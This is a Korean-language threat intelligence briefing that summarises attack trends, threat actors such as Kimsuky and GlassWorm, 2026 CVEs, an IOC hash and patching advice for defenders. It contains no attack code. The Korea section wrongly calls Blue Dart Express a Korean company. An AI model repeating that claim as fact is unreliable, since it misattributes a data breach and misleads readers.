최근 공격자들은 AI 도구(Claude, GPT 등)를 활용하여 공격 스크립트 작성 및 취약점 탐색 속도를 비약적으로 높이고 있으며, 특히 브라우저 확장 프로그램과 같은 새로운 AI 소비 채널을 통한 악성코드 유포가 증가하고 있습니다. 또한, Living Off the Land(LotL) 기법과 결합된 공급망 공격(npm 패키지 등)이 지속되고 있으며, 산업 제어 시스템(ICS/SCADA)을 겨냥한 지정학적 위협이 고조되고 있습니다. 취약점 공개 후 실제 악용까지의 시간(Exploitation Window)이 극도로 단축되어, 신속한 패치 관리와 위협 인텔리전스 기반의 선제적 대응이 필수적인 상황입니다.

### 2. 주요 위협 행위자 / 캠페인
*   **GlassWorm**: Zig 언어로 작성된 Dropper를 사용하여 개발자 IDE를 타겟으로 하는 캠페인.
*   **NoName057(16)**: 친러시아 성향의 핵티비스트 그룹으로, 우크라이나 및 영국 인프라 대상 DDoS 공격 수행.
*   **Stardust Chollima**: Axios npm 패키지 공급망 공격을 통해 침투를 시도한 것으로 추정되는 위협 행위자.
*   **Kimsuky**: GitLab 플랫폼을 악용하여 이력서 및 대북 정책 문서로 위장한 LNK 파일 유포.
*   **CanisterWorm**: 이란을 타겟으로 하는 와이퍼(Wiper) 공격을 수행하며, 보안이 취약한 클라우드 서비스를 통해 확산.

### 3. 한국 관련 위협
*   **Kimsuky**: GitLab을 활용한 악성 LNK 파일 유포 정황 포착 (이스트시큐리티 알약).
*   **K-CTI 2026**: 금융권 망분리 우회 공격 시나리오 및 위협 인텔리전스 결합 XDR 구축 전략 논의 (데일리시큐).
*   **기타**: 한국 기업(Blue Dart Express 등)의 데이터 유출 관련 언급이 있으나, 직접적인 한국 대상 대규모 공격 캠페인은 이번 수집 데이터 내에서 확인되지 않음.

### 4. 주요 CVE / 취약점 (CVSS 우선)
*   **CVE-2026-5996**: 미지정 제품, CVSS 9.8 (Critical), 악용 여부 확인 필요.
*   **CVE-2026-1340**: Ivanti Endpoint Manager Mobile, 코드 주입 취약점, **Active Exploitation**.
*   **CVE-2026-4351**: Wordpress, CVSS 8.1 (High), 악용 여부 확인 필요.
*   **CVE-2026-40242**: Arcane 1.17.3 이전 버전, SSRF 취약점, 악용 여부 확인 필요.
*   **CVE-2026-4664**: Wordpress, CVSS 5.3 (Medium), 악용 여부 확인 필요.

### 5. IOC 요약
*   **해시**: `a8ba9ba93b4509a86e3d7dd40fd0652c` ([SANS ISC](https://isc.sans.edu/diary/rss/32884))
*   **CVE**: `CVE-2026-1340` ([CyberBriefDaily](https://twitter.com/CyberBriefDaily/status/2042884773253673394)), `CVE-2026-5996` ([CVEarity](https://twitter.com/CVEarity/status/2042884578860503066)), `CVE-2026-4351` ([CVEarity](https://twitter.com/CVEarity/status/2042876233718075559))

### 6. 즉각 대응 권고
*   **Ivanti EPMM 패치**: CVE-2026-1340이 활발히 악용되고 있으므로 즉시 최신 보안 패치 적용.
*   **개발 환경 보안 강화**: Zig Dropper를 사용하는 GlassWorm 캠페인에 대비하여 IDE 및 개발자 PC의 비정상적인 프로세스 실행 모니터링 강화.
*   **공급망 검증**: 프로젝트 내 사용 중인 npm 패키지(특히 Axios 등)의 무결성을 검증하고, 불필요한 AI 브라우저 확장 프로그램 사용 제한.

### 7. 위협 수준 평가
*   **점수**: 8/10
*   **근거**: AI를 활용한 공격 자동화와 제로데이 취약점의 빠른 악용이 결합되어 방어자의 대응 시간을 압박하고 있으며, 특히 인프라 타겟 공격이 빈번하게 발생하고 있음.
